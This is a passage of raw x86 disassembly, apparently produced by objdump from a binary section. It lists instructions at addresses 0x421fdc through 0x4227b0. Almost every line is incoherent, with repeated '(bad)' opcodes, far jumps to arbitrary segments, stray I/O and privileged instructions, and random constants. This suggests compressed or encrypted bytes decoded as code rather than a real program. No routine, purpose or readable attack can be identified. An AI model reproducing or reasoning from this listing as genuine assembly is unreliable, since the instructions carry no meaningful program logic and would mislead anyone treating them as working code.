  421fdc:	mov    ebx,0xf98d177a
  421fe1:	jmp    0x3bbe:0x36d806a9
  421fe8:	lods   eax,DWORD PTR ds:[esi]
  421fe9:	(bad)  
  421fea:	cmc    
  421feb:	pop    ds
  421fec:	mov    dl,0xe2
  421fee:	bound  esp,QWORD PTR [ebx+0x7ddc1893]
  421ff4:	push   esi
  421ff5:	ret    
  421ff6:	addr16 cmp eax,0xad3e36fc
  421ffc:	dec    ebp
  421ffd:	mov    al,ds:0xb69b5354
  422002:	stc    
  422003:	inc    edx
  422004:	call   DWORD PTR [eax*1+0x0]
  42200b:	add    BYTE PTR [eax],al
  42200d:	add    BYTE PTR [eax],al
  42200f:	add    BYTE PTR [eax],al
  422011:	inc    edx
  422012:	dec    edi
  422013:	nop
  422014:	int3   
  422015:	popf   
  422016:	fistp  WORD PTR [esi-0x31]
  422019:	lea    ecx,[ebx]
  42201b:	jmp    0xbfc53f76
  422020:	cmp    BYTE PTR [ecx-0x51fffe67],al
  422026:	add    eax,DWORD PTR [eax]
  422028:	add    cl,bh
  42202a:	adc    edx,ebx
  42202c:	fcom   QWORD PTR [ebx-0x11]
  42202f:	aam    0xba
  422031:	scas   eax,DWORD PTR es:[edi]
  422032:	or     eax,0x92c15fec
  422037:	das    
  422038:	enter  0x3c72,0x6e
  42203c:	xchg   ebx,eax
  42203d:	inc    edi
  42203e:	enter  0x460b,0xf0
  422042:	xchg   edi,eax
  422043:	ss nop
  422045:	pop    ebx
  422046:	xor    eax,0x91248019
  42204b:	sub    al,0x7e
  42204d:	jmp    0x7737:0x8be756bf
  422054:	ss pop esi
  422056:	leave  
  422057:	enter  0x181,0x9a
  42205b:	cmp    DWORD PTR [eax-0x7b],edx
  42205e:	ins    DWORD PTR es:[edi],dx
  42205f:	nop
  422060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422061:	ficom  DWORD PTR [ecx]
  422063:	push   esi
  422064:	xor    BYTE PTR [eax],bh
  422066:	inc    eax
  422067:	icebp  
  422068:	jno    0x422041
  42206a:	leave  
  42206b:	dec    esi
  42206c:	dec    eax
  42206d:	inc    ecx
  42206e:	inc    esp
  42206f:	test   al,0xec
  422071:	xor    BYTE PTR [edi],cl
  422073:	cwde   
  422074:	xor    al,0x63
  422076:	mov    ebx,0x6c167968
  42207b:	ret    
  42207c:	push   esi
  42207d:	gs aaa 
  42207f:	(bad)  [ecx+0x11]
  422082:	aaa    
  422083:	pop    ebx
  422084:	add    bl,BYTE PTR [edx+0x7d]
  422087:	test   BYTE PTR [ebp+eiz*2+0x7a96e0cd],dl
  42208e:	das    
  42208f:	jmp    0xb5af:0xeb54fd15
  422096:	dec    esi
  422097:	or     DWORD PTR [ebx-0x37e861d6],ebp
  42209d:	arpl   bp,sp
  42209f:	pushf  
  4220a0:	mov    ds:0x917c0696,al
  4220a5:	jp     0x422061
  4220a7:	ja     0x42203b
  4220a9:	repnz (bad) 
  4220ab:	in     eax,0x8a
  4220ad:	sub    eax,0xa6562e44
  4220b2:	mov    ds:0x4a4305b3,al
  4220b7:	sub    dh,BYTE PTR [ecx-0x2e]
  4220ba:	rcr    DWORD PTR [ebp+0x33],cl
  4220bd:	jmp    0xfeae:0xd704de20
  4220c4:	out    dx,eax
  4220c5:	mov    bh,BYTE PTR ds:0xcc8a3302
  4220cb:	or     bh,bl
  4220cd:	mov    edx,0x930d9825
  4220d2:	les    eax,FWORD PTR [ebx+0x7a3a86aa]
  4220d8:	sub    edi,DWORD PTR [eax+0x5c]
  4220db:	out    0x52,eax
  4220dd:	pop    eax
  4220de:	enter  0xc380,0x23
  4220e2:	ja     0x4220ec
  4220e4:	ss mov esp,0x2ee845b4
  4220ea:	mov    al,cl
  4220ec:	dec    eax
  4220ed:	scas   eax,DWORD PTR es:[edi]
  4220ee:	inc    ecx
  4220ef:	pop    ebp
  4220f0:	test   eax,0x84adcbb6
  4220f5:	enter  0x9056,0x51
  4220f9:	lock (bad) 
  4220fb:	das    
  4220fc:	cmp    eax,0x41d3d5f5
  422101:	mov    edx,0x10889e7e
  422106:	pop    esi
  422107:	call   FWORD PTR [ebp-0x35]
  42210a:	(bad)  
  42210b:	retf   0x6d6a
  42210e:	push   ds
  42210f:	pop    ebp
  422110:	out    0xca,eax
  422112:	pop    ds
  422113:	(bad)  
  422114:	fiadd  WORD PTR [edx+0x656a350c]
  42211a:	adc    DWORD PTR [edi-0x31],edx
  42211d:	repnz or eax,0xfb743cf
  422123:	mov    edx,DWORD PTR [edi]
  422125:	sub    BYTE PTR [eax],cl
  422127:	add    cl,bl
  422129:	scas   eax,DWORD PTR es:[edi]
  42212a:	add    al,0xb2
  42212c:	je     0x422144
  42212e:	cwde   
  42212f:	push   cs
  422130:	cmp    DWORD PTR [esi],ebp
  422132:	pop    edi
  422133:	repz mov bh,BYTE PTR [esi]
  422136:	mov    cs,WORD PTR [eax-0x624caf9]
  42213c:	jo     0x422191
  42213e:	adc    ebx,esp
  422140:	or     bl,BYTE PTR [eax-0x3861a3b8]
  422146:	dec    edi
  422147:	aaa    
  422148:	pop    esi
  422149:	and    edi,0xffffff87
  42214c:	fldcw  WORD PTR [ecx+0x2a]
  42214f:	adc    BYTE PTR [ecx],cl
  422151:	inc    DWORD PTR [edx+0x3a]
  422154:	lahf   
  422155:	mov    ebx,0x68aff5be
  42215a:	pop    ecx
  42215b:	into   
  42215c:	leave  
  42215d:	mov    bh,0x3c
  42215f:	scas   eax,DWORD PTR es:[edi]
  422160:	or     DWORD PTR [edi+0xfd8f8aa],eax
  422166:	(bad)  
  422167:	sub    eax,0xd02ed655
  42216c:	inc    ecx
  42216d:	mov    ds:0xd625d67,al
  422172:	dec    ecx
  422173:	mov    WORD PTR [ecx+0x5],gs
  422176:	and    al,ch
  422178:	xor    eax,0x42fef168
  42217d:	pop    esi
  42217e:	stos   BYTE PTR es:[edi],al
  42217f:	ret    0x4e3
  422182:	mov    eax,ds:0xfc91c704
  422187:	arpl   si,di
  422189:	pop    ds
  42218a:	inc    ebp
  42218b:	push   es
  42218c:	sub    eax,0xd6fa856d
  422191:	lahf   
  422192:	lods   al,BYTE PTR ds:[esi]
  422193:	and    al,0x70
  422195:	push   edx
  422196:	adc    DWORD PTR [ebx+0x18],0x1e
  42219a:	ret    0x6ef
  42219d:	test   DWORD PTR [ecx+0x1c6831a0],ebp
  4221a3:	xor    BYTE PTR [esp+esi*2],bh
  4221a6:	imul   ebx,edx,0xf8fca4e
  4221ac:	(bad)  
  4221ad:	(bad)  
  4221ae:	stos   BYTE PTR es:[edi],al
  4221af:	pop    edx
  4221b0:	loop   0x42219a
  4221b2:	or     BYTE PTR [edx],0xef
  4221b5:	mul    cl
  4221b7:	cmp    al,0x3c
  4221b9:	jp     0x4221b6
  4221bb:	and    esi,DWORD PTR [ecx-0x3f]
  4221be:	sub    BYTE PTR ds:0x18c13a7,dl
  4221c4:	xor    DWORD PTR [ebx+0x12],ebp
  4221c7:	jno    0x4221f8
  4221c9:	movd   edi,mm5
  4221cc:	sub    bl,BYTE PTR [esi-0x3dee8194]
  4221d2:	sbb    ch,BYTE PTR [esi]
  4221d4:	xchg   esp,eax
  4221d5:	jge    0x4221ce
  4221d7:	stos   DWORD PTR es:[edi],eax
  4221d8:	pop    ss
  4221d9:	mov    eax,ds:0xb3815bcc
  4221de:	in     eax,0x7b
  4221e0:	dec    edi
  4221e1:	adc    al,0x54
  4221e3:	loop   0x42224a
  4221e5:	stos   BYTE PTR es:[edi],al
  4221e6:	jl     0x4221da
  4221e8:	imul   BYTE PTR [ebx+ebx*2-0x38]
  4221ec:	lods   eax,DWORD PTR ds:[esi]
  4221ed:	in     al,0x57
  4221ef:	and    esp,DWORD PTR [ecx+0x56]
  4221f2:	pop    ss
  4221f3:	xor    BYTE PTR [edi-0x6e],al
  4221f6:	mov    ch,0x35
  4221f8:	mov    ecx,0xbeb144c5
  4221fd:	rcr    BYTE PTR [esi+0x7f],1
  422200:	push   DWORD PTR [edx-0x45]
  422203:	neg    DWORD PTR [eax-0x58]
  422206:	pop    ebp
  422207:	jecxz  0x422223
  422209:	stos   DWORD PTR es:[edi],eax
  42220a:	stc    
  42220b:	inc    ebp
  42220c:	mov    ebp,0x3e42a672
  422211:	rcr    DWORD PTR [ebx-0xa849068],cl
  422217:	jbe    0x42219c
  422219:	cdq    
  42221a:	imul   ebx,ebp,0xba47e60
  422220:	or     al,0xa6
  422222:	enter  0xf976,0xa9
  422226:	sub    al,0x56
  422228:	loope  0x4221ec
  42222a:	adc    BYTE PTR [esi+0x24c8c82c],0xf9
  422231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422232:	test   DWORD PTR [edx-0x79],ecx
  422235:	push   edx
  422236:	jp     0x422257
  422238:	mov    esp,0x38d77cea
  42223d:	stos   BYTE PTR es:[edi],al
  42223e:	cli    
  42223f:	fs mov ecx,0xa198e851
  422245:	adc    cl,BYTE PTR [ebp-0x2b]
  422248:	inc    edi
  422249:	scas   al,BYTE PTR es:[edi]
  42224a:	bound  ebx,QWORD PTR [ecx]
  42224c:	xchg   ecx,eax
  42224d:	sub    edi,DWORD PTR [esi]
  42224f:	jmp    0x4784:0x7faf930c
  422256:	jecxz  0x4222c3
  422258:	(bad)  
  422259:	pushf  
  42225a:	xor    al,0x81
  42225c:	fild   WORD PTR [edx]
  42225e:	jmp    0xb2dba529
  422263:	leave  
  422264:	lods   al,BYTE PTR ds:[esi]
  422265:	jns    0x42226a
  422267:	push   ss
  422268:	add    ebp,DWORD PTR [esi+0x3a8b29af]
  42226e:	iret   
  42226f:	loope  0x422275
  422271:	or     edx,ecx
  422273:	and    DWORD PTR [ebp-0x7],ebx
  422276:	fcomp  DWORD PTR [eax]
  422278:	xchg   edi,eax
  422279:	int    0xb1
  42227b:	lds    esi,FWORD PTR cs:[esi-0x21]
  42227f:	dec    ebx
  422280:	or     ch,BYTE PTR [edi+0x1b]
  422283:	addr16 cwde 
  422285:	add    al,0x47
  422287:	adc    al,0xd6
  422289:	and    ah,BYTE PTR [edi-0x1]
  42228c:	xor    ebx,DWORD PTR [esi+0x74419df6]
  422292:	jp     0x422275
  422294:	(bad)  
  422295:	jmp    DWORD PTR [edx+0xf]
  422298:	js     0x4222f3
  42229a:	pop    esp
  42229b:	cmp    al,0x43
  42229d:	jae    0x422314
  42229f:	jl     0x42223b
  4222a1:	sub    al,dl
  4222a3:	push   ebx
  4222a4:	fidiv  DWORD PTR [ebx+0x68599c7b]
  4222aa:	adc    cl,ch
  4222ac:	fcom   st(2)
  4222ae:	mov    esp,0xfb8dba18
  4222b3:	mov    BYTE PTR [esi+0x37a0fcf8],dl
  4222b9:	inc    ebx
  4222ba:	pop    ebx
  4222bb:	ins    DWORD PTR es:[edi],dx
  4222bc:	adc    ecx,DWORD PTR ds:0x2490666f
  4222c2:	ret    0x9966
  4222c5:	jo     0x42228b
  4222c7:	pop    es
  4222c8:	jle    0x4222d4
  4222ca:	lock stc 
  4222cc:	dec    esp
  4222cd:	arpl   WORD PTR [eax],cx
  4222cf:	int    0xdd
  4222d1:	jnp    0x4222fc
  4222d3:	sub    al,0xa
  4222d5:	shr    DWORD PTR [edi],cl
  4222d7:	jmp    0x42230e
  4222d9:	jecxz  0x4222fc
  4222db:	test   eax,0x99921492
  4222e0:	ds dec esp
  4222e2:	add    al,BYTE PTR [eax+0x67]
  4222e5:	mov    al,ch
  4222e7:	jbe    0x422359
  4222e9:	fmul   DWORD PTR [ebp-0x79]
  4222ec:	push   edi
  4222ed:	test   bl,bl
  4222ef:	xchg   edi,eax
  4222f0:	in     eax,0x67
  4222f2:	xor    ebx,edx
  4222f4:	ss bnd jp 0x422368
  4222f8:	add    eax,0x51262c86
  4222fd:	mov    DWORD PTR [edi+0x23b5ac1e],esp
  422303:	shl    ch,0x77
  422306:	push   ebp
  422307:	stos   BYTE PTR es:[edi],al
  422308:	std    
  422309:	ins    DWORD PTR es:[edi],dx
  42230a:	dec    ecx
  42230b:	sahf   
  42230c:	or     bh,BYTE PTR [ecx]
  42230e:	lods   eax,DWORD PTR ds:[esi]
  42230f:	add    al,BYTE PTR [esi+0x4944a18d]
  422315:	addr16 test al,0x40
  422318:	xor    bh,dh
  42231a:	repz daa 
  42231c:	lea    ecx,[ebx]
  42231e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42231f:	sbb    al,BYTE PTR [ebx-0x1a]
  422322:	sti    
  422323:	cmp    DWORD PTR [ebx],ecx
  422325:	sub    cl,BYTE PTR [esi]
  422327:	(bad)  
  422328:	out    0xc0,eax
  42232a:	sbb    dh,BYTE PTR [ebp+0x7804bc76]
  422330:	sub    al,0x50
  422332:	repnz inc eax
  422334:	fnsave [edx]
  422336:	jge    0x4222df
  422338:	stc    
  422339:	pop    ds
  42233a:	mov    BYTE PTR [esi+edx*1+0x1411477c],dl
  422341:	sub    eax,DWORD PTR [ebx-0x22]
  422344:	or     al,0xcb
  422346:	stos   BYTE PTR es:[edi],al
  422347:	test   al,0x7c
  422349:	mov    edi,0x765368ad
  42234e:	pop    ds
  42234f:	aad    0x6c
  422351:	push   edi
  422352:	cmc    
  422353:	aaa    
  422354:	inc    ecx
  422355:	cmp    DWORD PTR [ecx],eax
  422357:	aas    
  422358:	mov    dh,0xd
  42235a:	test   BYTE PTR [esp+ecx*8],bl
  42235d:	aaa    
  42235e:	adc    cl,bl
  422360:	inc    ebp
  422361:	(bad)  
  422362:	jmp    0x42235f
  422364:	scas   eax,DWORD PTR es:[edi]
  422365:	pop    esi
  422366:	cmp    dh,BYTE PTR ds:0xf48d653b
  42236c:	adc    BYTE PTR [eax-0x55e43b7c],dl
  422372:	jg     0x4223ea
  422374:	pop    esp
  422375:	xchg   edx,eax
  422376:	mov    ecx,0x39008ec8
  42237b:	inc    esi
  42237c:	mov    ds,eax
  42237e:	jae    0x422396
  422380:	mov    dh,0x73
  422382:	popf   
  422383:	iret   
  422384:	(bad)  
  422385:	shl    esi,cl
  422387:	sbb    DWORD PTR [ecx],esp
  422389:	pop    esp
  42238a:	mov    ch,BYTE PTR [eax-0x1b]
  42238d:	dec    ebp
  42238e:	jmp    0x42234a
  422390:	mov    dl,0x27
  422392:	or     ecx,esp
  422394:	sbb    al,0x2c
  422396:	mov    dl,bh
  422398:	sti    
  422399:	push   esi
  42239a:	or     BYTE PTR [ebx+0x1b],cl
  42239d:	jns    0x42235c
  42239f:	xchg   ebx,eax
  4223a0:	jno    0x422393
  4223a2:	pop    esi
  4223a3:	sub    bh,cl
  4223a5:	shl    ebp,cl
  4223a7:	fwait
  4223a8:	mov    ds:0xed4fda92,al
  4223ad:	xchg   ebp,eax
  4223ae:	add    BYTE PTR [edx+0x17],cl
  4223b1:	je     0x422371
  4223b3:	push   ebp
  4223b4:	mov    WORD PTR [edi-0x471a9a34],ds
  4223ba:	dec    edi
  4223bb:	shl    DWORD PTR [ebx+0xf],1
  4223be:	mov    bl,0xc9
  4223c0:	sahf   
  4223c1:	adc    dh,cl
  4223c3:	ins    BYTE PTR es:[edi],dx
  4223c4:	xchg   ebx,eax
  4223c5:	adc    dh,BYTE PTR [ecx+0x38a44533]
  4223cb:	dec    ebx
  4223cc:	leave  
  4223cd:	xchg   eax,edx
  4223cf:	aaa    
  4223d0:	jp     0x42242c
  4223d2:	not    BYTE PTR [ebp+0xefd6ee]
	...
  4223e0:	add    BYTE PTR [esi+0x7c],ah
  4223e3:	loopne 0x4223a0
  4223e5:	cli    
  4223e6:	mov    edi,0xa15cfd7f
  4223eb:	pop    esp
  4223ec:	dec    edi
  4223ed:	xchg   dh,cl
  4223ef:	cmp    eax,0x19d2fa6
  4223f4:	add    BYTE PTR [esi+0x6a000003],ch
  4223fa:	cmp    ch,dl
  4223fc:	je     0x4223e4
  4223fe:	and    eax,0xe9cc734b
  422403:	inc    ebp
  422404:	pop    ss
  422405:	xor    ch,bh
  422407:	mov    bh,0xa6
  422409:	dec    ecx
  42240a:	test   DWORD PTR [esi+0x57],esi
  42240d:	outs   dx,DWORD PTR ds:[esi]
  42240e:	dec    ebx
  42240f:	into   
  422410:	in     al,dx
  422411:	retf   0xe17f
  422414:	imul   ebp,DWORD PTR [ebp-0x45db0bc8],0x1f
  42241b:	cmp    al,0x2d
  42241d:	add    BYTE PTR [ecx+0x2b4b9e7b],0xf4
  422424:	dec    esi
  422425:	pop    edx
  422426:	inc    ebx
  422427:	pop    ecx
  422428:	into   
  422429:	mov    ebp,0x72a7d9b
  42242e:	test   eax,0xc5142be2
  422433:	mov    dh,al
  422435:	das    
  422436:	cdq    
  422437:	mov    edi,0x3597874e
  42243c:	inc    ebx
  42243d:	inc    ebx
  42243e:	popf   
  42243f:	fisubr WORD PTR [ecx+esi*2]
  422442:	xchg   esi,ebp
  422444:	push   ss
  422445:	icebp  
  422446:	sbb    esp,DWORD PTR [esi]
  422448:	mov    ebx,0x14ed8d7c
  42244e:	rcr    dl,cl
  422450:	in     eax,dx
  422451:	sub    ecx,eax
  422453:	js     0x422422
  422455:	mov    BYTE PTR [edx-0x2b],ch
  422458:	mov    fs,WORD PTR ds:0xc2804a15
  42245e:	pop    esp
  42245f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422460:	jne    0x422453
  422462:	sahf   
  422463:	push   ds
  422464:	in     al,dx
  422465:	es cdq 
  422467:	mov    dl,0xcf
  422469:	(bad)  
  42246a:	out    0xeb,al
  42246c:	jl     0x42244a
  42246e:	fwait
  42246f:	pop    esi
  422470:	sbb    DWORD PTR [ecx+0x27],0x1cba6e85
  422477:	(bad)  
  422478:	fistp  DWORD PTR [ecx-0x69]
  42247b:	dec    esp
  42247c:	jmp    0xb12d6a3c
  422481:	push   edx
  422482:	and    dl,bh
  422484:	mov    WORD PTR [edi],ds
  422486:	xchg   edi,eax
  422487:	jmp    0x4224b9
  422489:	cwde   
  42248a:	cmp    ebp,ecx
  42248c:	inc    ecx
  42248d:	sbb    cl,bh
  42248f:	cwde   
  422490:	imul   esp,DWORD PTR [ecx-0x64],0xd6cf2b20
  422497:	or     BYTE PTR [edi+edx*2+0x17],ah
  42249b:	es jnp 0x4224ef
  42249e:	xchg   DWORD PTR [edi],esp
  4224a0:	call   0xd05f:0xecb21501
  4224a7:	mov    ebx,ebp
  4224a9:	vmwrite edi,DWORD PTR [ecx]
  4224ac:	pop    ebx
  4224ad:	aaa    
  4224ae:	fidiv  WORD PTR [eax]
  4224b0:	xlat   BYTE PTR ds:[ebx]
  4224b1:	jge    0x422443
  4224b3:	aad    0x92
  4224b5:	dec    DWORD PTR [esi]
  4224b7:	mov    BYTE PTR [ecx],cl
  4224b9:	test   eax,0xb967a269
  4224be:	repnz or al,0x19
  4224c1:	or     ebx,edx
  4224c3:	outs   dx,BYTE PTR ds:[esi]
  4224c4:	cmp    cl,bl
  4224c6:	pop    ss
  4224c7:	imul   edi,DWORD PTR [eax-0x4e],0x4cdd6f80
  4224ce:	mov    esi,0x9981751d
  4224d3:	dec    esi
  4224d4:	pop    es
  4224d5:	pop    ebx
  4224d6:	mov    BYTE PTR [eax+0x1d00350d],al
  4224dc:	out    dx,al
  4224dd:	sbb    al,0x63
  4224df:	test   al,0xe0
  4224e1:	ret    0x91e8
  4224e4:	and    esp,DWORD PTR [ebx]
  4224e6:	jp     0x4224c8
  4224e8:	adc    ebx,DWORD PTR ss:[esi+eax*1-0x62599721]
  4224f0:	repz jne 0x422538
  4224f3:	test   DWORD PTR [edx-0x399c718e],edi
  4224f9:	mov    al,ds:0x2dbb8b64
  4224ff:	test   al,0x4
  422501:	xor    al,0x3a
  422503:	repz dec esi
  422505:	jge    0x4224a9
  422507:	gs cwde 
  422509:	inc    eax
  42250a:	push   es
  42250b:	adc    al,0xd5
  42250d:	test   BYTE PTR [edx],ah
  42250f:	sbb    al,0xc5
  422511:	stc    
  422512:	add    ah,BYTE PTR [edi-0x5e475ea8]
  422518:	jbe    0x422512
  42251a:	mov    BYTE PTR fs:[ebx-0x6048a084],0xf6
  422522:	ret    
  422523:	out    0xd7,eax
  422525:	int3   
  422526:	mov    bh,0x22
  422528:	xor    DWORD PTR [ecx],ebx
  42252a:	and    eax,DWORD PTR [ebp-0x2e158e13]
  422530:	xchg   edi,eax
  422531:	adc    esp,DWORD PTR [ebp+0x747af522]
  422537:	cdq    
  422538:	int3   
  422539:	cmp    al,BYTE PTR ss:[ebp-0x268ac4a7]
  422540:	ret    
  422541:	imul   esp,DWORD PTR [ebx-0x67],0x1f4d76bd
  422548:	mov    bh,al
  42254a:	fst    st(3)
  42254c:	test   BYTE PTR [edi],ch
  42254e:	xor    al,0xd6
  422550:	add    bl,bh
  422552:	xor    ecx,DWORD PTR [eax+0x51]
  422555:	cmp    eax,0x6cf56c4b
  42255a:	retf   0x5c00
  42255d:	lahf   
  42255e:	shr    BYTE PTR [ebx+eiz*8-0x76],0x8c
  422563:	iret   
  422564:	mov    bh,0x21
  422566:	adc    DWORD PTR [edi+0x6a],edx
  422569:	fimul  DWORD PTR [ecx]
  42256b:	dec    esp
  42256c:	add    BYTE PTR [edx],dl
  42256e:	mov    ds:0x7622eb6,eax
  422573:	ja     0x42253b
  422575:	mov    bh,0x5a
  422577:	shl    DWORD PTR [esi+0x2dc8cbd2],cl
  42257d:	mov    dl,0xd7
  42257f:	not    BYTE PTR [ebx+0x16cd5c73]
  422585:	pop    ebx
  422586:	and    BYTE PTR [ebx],dl
  422588:	mov    edi,0xcd26829b
  42258d:	add    ecx,DWORD PTR [edx-0x3c]
  422590:	aaa    
  422591:	inc    ecx
  422592:	outs   dx,DWORD PTR ds:[esi]
  422593:	xchg   BYTE PTR [ebx-0x43],ch
  422596:	out    0x5f,eax
  422598:	xor    edx,DWORD PTR ds:0x1fc73025
  42259e:	mov    cl,0x2b
  4225a0:	mov    edx,0xa9b4623d
  4225a5:	call   0x3603:0x9fc95d79
  4225ac:	add    eax,0xa2352ad2
  4225b1:	inc    ebx
  4225b2:	std    
  4225b3:	mov    eax,ds:0x133da08
  4225b8:	dec    edi
  4225b9:	jecxz  0x42257b
  4225bb:	stos   DWORD PTR es:[edi],eax
  4225bc:	jp     0x4225af
  4225be:	inc    esi
  4225bf:	icebp  
  4225c0:	or     al,0xd1
  4225c2:	ins    BYTE PTR es:[edi],dx
  4225c3:	inc    edi
  4225c4:	ss (bad) 
  4225c6:	popf   
  4225c7:	pop    esi
  4225c8:	inc    ebp
  4225c9:	stos   BYTE PTR es:[edi],al
  4225ca:	and    edx,DWORD PTR [esi+0x5]
  4225cd:	xor    al,0xb3
  4225cf:	xor    al,0xbb
  4225d1:	xlat   BYTE PTR ds:[ebx]
  4225d2:	sar    DWORD PTR [esi+eiz*4],cl
  4225d5:	mov    dl,0x7
  4225d7:	mov    edx,0x23b647e
  4225dc:	mov    dl,0x89
  4225de:	or     eax,0x29c5ece2
  4225e3:	daa    
  4225e4:	dec    ebx
  4225e5:	fsubr  QWORD PTR [esi+esi*1-0x57108269]
  4225ec:	ins    DWORD PTR es:[edi],dx
  4225ed:	int    0x8b
  4225ef:	lods   al,BYTE PTR ds:[esi]
  4225f0:	fadd   QWORD PTR [ebp+0x2b]
  4225f3:	or     al,cl
  4225f5:	daa    
  4225f6:	and    al,0xa3
  4225f8:	mov    ecx,0x11cebf93
  4225fd:	retf   
  4225fe:	inc    eax
  4225ff:	sbb    BYTE PTR [esi+0x4a],bl
  422602:	or     al,0x4e
  422604:	rcl    BYTE PTR [esi],0xe6
  422607:	sbb    DWORD PTR [edx],edx
  422609:	stos   DWORD PTR es:[edi],eax
  42260a:	or     eax,0x2158fbb7
  42260f:	repnz cmc 
  422611:	lods   al,BYTE PTR ds:[esi]
  422612:	mov    ebp,0x4d4f8423
  422617:	jno    0x4225ad
  422619:	(bad)  
  42261a:	fistp  WORD PTR [esi+0x39c280fe]
  422620:	jp     0x422639
  422622:	jns    0x4225be
  422624:	xor    ch,cl
  422626:	jb     0x4225c2
  422628:	sub    al,0x2b
  42262a:	into   
  42262b:	mov    DWORD PTR [esp+ebx*8+0x5c],0xee6706b6
  422633:	add    eax,0x1329e6a
  422638:	clc    
  422639:	and    al,0x21
  42263b:	push   edi
  42263c:	mov    ah,0x33
  42263e:	(bad)  [ecx+0x4d]
  422641:	in     al,dx
  422642:	sub    edx,ecx
  422644:	je     0x42266b
  422646:	pop    ebx
  422647:	push   ecx
  422648:	xor    ebp,edx
  42264a:	inc    eax
  42264b:	mov    cl,0xc9
  42264d:	icebp  
  42264e:	mov    esi,0x232c10d8
  422653:	cmp    eax,0x62c44363
  422658:	hlt    
  422659:	lods   eax,DWORD PTR ds:[esi]
  42265a:	cmp    ecx,DWORD PTR [edi-0x4c]
  42265d:	adc    eax,0x144131c9
  422662:	mov    ecx,0x39c07240
  422667:	fisttp QWORD PTR [edx+0x5d1ca3aa]
  42266d:	scas   al,BYTE PTR es:[edi]
  42266e:	das    
  42266f:	ins    DWORD PTR es:[edi],dx
  422670:	dec    esp
  422671:	nop
  422672:	pop    ebp
  422673:	xchg   esi,eax
  422674:	push   es
  422675:	pop    esp
  422676:	jle    0x422693
  422678:	fidivr WORD PTR [ebx+edi*4]
  42267b:	add    BYTE PTR [ecx-0x76],bh
  42267e:	and    cl,0x4c
  422681:	(bad)  
  422682:	adc    cl,BYTE PTR [ecx-0xfc61f95]
  422688:	add    bl,BYTE PTR [ecx+0x362a56b9]
  42268e:	inc    esp
  42268f:	retf   
  422690:	push   0x6ad71ec0
  422695:	jnp    0x422642
  422697:	jecxz  0x42265d
  422699:	repz add eax,0xd5a7a6fc
  42269f:	xchg   DWORD PTR [ebp-0x1015aec6],eax
  4226a5:	in     eax,0x35
  4226a7:	jecxz  0x42270a
  4226a9:	in     eax,0x1a
  4226ab:	mov    ?,WORD PTR [ecx-0x38]
  4226ae:	dec    ebp
  4226af:	xor    ebx,DWORD PTR [ebp-0x5c]
  4226b2:	cs mov esi,0xbd6b68d6
  4226b8:	add    al,BYTE PTR [esi+0x3d]
  4226bb:	sbb    eax,0x1e9fa679
  4226c0:	push   0xd0f90c92
  4226c5:	int3   
  4226c6:	jae    0x42267c
  4226c8:	stc    
  4226c9:	cmp    ah,al
  4226cb:	xor    al,0x75
  4226cd:	xor    ebx,esi
  4226cf:	pop    ebx
  4226d0:	cs in  eax,dx
  4226d2:	jmp    0x35926f8a
  4226d7:	loop   0x422687
  4226d9:	cmp    DWORD PTR [edx-0x71],ebp
  4226dc:	bound  edi,QWORD PTR gs:[edx+eax*4+0x52]
  4226e1:	adc    esp,edi
  4226e3:	push   edi
  4226e4:	mov    WORD PTR [esi+0x229d5520],cs
  4226ea:	iret   
  4226eb:	adc    eax,0x90ed8f6b
  4226f0:	je     0x4226ba
  4226f2:	in     al,dx
  4226f3:	outs   dx,BYTE PTR ds:[esi]
  4226f4:	push   eax
  4226f5:	mov    eax,DWORD PTR [edx+0x96ac8b4]
  4226fb:	into   
  4226fc:	push   ss
  4226fd:	aas    
  4226fe:	daa    
  4226ff:	mov    al,ds:0x4aec8f0e
  422704:	fninit 
  422706:	pop    ds
  422707:	loope  0x4226f8
  422709:	fwait
  42270a:	jmp    0x4226c4
  42270c:	adc    bl,BYTE PTR [eax+ecx*8-0x5b]
  422710:	cdq    
  422711:	loopne 0x4226e1
  422713:	inc    edi
  422714:	xor    ah,ch
  422716:	jecxz  0x4226f0
  422718:	test   eax,0x34fd859a
  42271d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42271e:	cmp    al,0xd
  422720:	inc    ecx
  422721:	mov    dl,0x1
  422723:	xchg   edi,eax
  422724:	arpl   si,bp
  422726:	or     eax,0x58eb4
  42272b:	jbe    0x42272e
  42272d:	push   0xfffffffa
  42272f:	in     al,dx
  422730:	dec    ebp
  422731:	jb     0x42276e
  422733:	(bad)  
  422734:	and    BYTE PTR [ebx+0x6ba02ce3],bl
  42273a:	push   ss
  42273b:	retf   0xdad0
  42273e:	xor    BYTE PTR [edi],bl
  422740:	push   edx
  422741:	lock idiv DWORD PTR [edx+0x49]
  422745:	hlt    
  422746:	es xchg ebx,eax
  422748:	xor    ebp,eax
  42274a:	pop    ecx
  42274b:	add    eax,0x8e6c572d
  422750:	inc    edx
  422751:	adc    BYTE PTR [eax+ebx*2+0xc],0xf7
  422756:	iret   
  422757:	js     0x422703
  422759:	(bad)  
  42275a:	mov    esp,0xf2a0d40e
  42275f:	adc    al,0x60
  422761:	push   esp
  422762:	gs popf 
  422764:	cmp    bh,al
  422766:	out    0x75,eax
  422768:	ret    0x7745
  42276b:	jge    0x4226f4
  42276d:	jge    0x4227b9
  42276f:	xchg   ebp,eax
  422770:	jmp    0x4227c3
  422772:	bound  ebx,QWORD PTR [edi-0x54]
  422775:	push   0xe5033031
  42277a:	mov    cl,0xa1
  42277c:	test   BYTE PTR ds:0xca7037b,bh
  422782:	push   ebp
  422783:	sbb    ch,BYTE PTR [ecx]
  422785:	je     0x42279e
  422787:	scas   al,BYTE PTR es:[edi]
  422788:	dec    esi
  422789:	mov    ch,0x3e
  42278b:	lahf   
  42278c:	ins    DWORD PTR es:[edi],dx
  42278d:	int3   
  42278e:	push   ebx
  42278f:	ds pop esi
  422791:	cdq    
  422792:	xchg   edi,eax
  422793:	(bad)  
  422794:	pop    edi
  422795:	retf   
  422796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422797:	dec    edi
  422798:	outs   dx,BYTE PTR ds:[esi]
  422799:	sbb    al,BYTE PTR [esi-0xce03bb3]
  42279f:	test   eax,0x5e3d0d8f
  4227a4:	add    DWORD PTR [ebp+0xf4],ebp
  4227aa:	add    BYTE PTR [eax],al
  4227ac:	add    BYTE PTR [eax],al
  4227ae:	add    BYTE PTR [eax],al
  4227b0:	add    BYTE PTR [edi+0x75],ah
